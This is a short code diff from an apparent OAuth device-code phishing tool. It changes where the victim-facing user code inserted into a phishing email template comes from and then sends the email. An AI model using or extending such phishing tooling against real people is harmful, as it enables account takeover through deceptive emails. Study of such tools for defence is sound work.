@@ -95,7 +95,7 @@ class OAuthPhishing(TextColor):
           self.subject = self.data['Subject']
           self.message = self.data['Message']
           self.message = self.message.replace('Name', name)
-          self.message = self.message.replace('User_code', self.user_code)
+          self.message = self.message.replace('User_code', self.auth_response.get("user_code"))
           print("Sending mail...", end='\r')
           send_email(self.subject, self.message, sender_email, receiver_email, password)
     except KeyboardInterrupt:
